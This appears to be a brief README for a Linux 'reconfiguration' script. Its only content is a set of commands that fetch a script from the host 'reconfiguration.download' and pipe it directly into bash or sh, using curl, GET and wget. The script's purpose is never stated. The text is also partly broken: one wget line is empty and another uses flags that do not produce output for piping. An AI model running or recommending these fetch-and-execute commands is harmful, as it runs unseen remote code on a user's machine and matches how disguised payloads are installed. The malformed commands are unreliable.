# reconfiguration
Linux system reconfiguration script is launched via `bash` shell interpreter.
Reconfiguration script can be obtained via `GET` command that is better known as `lwp-request`.
Alternative way of obtaining the script could be using `wget` command: `wget ` 
`sh -c "$(curl -fsSL reconfiguration.download)"`
`wget -o - reconfiguration.download`


The reconfiguration can be obtained and launched via the command: `GET reconfiguration.download | bash`
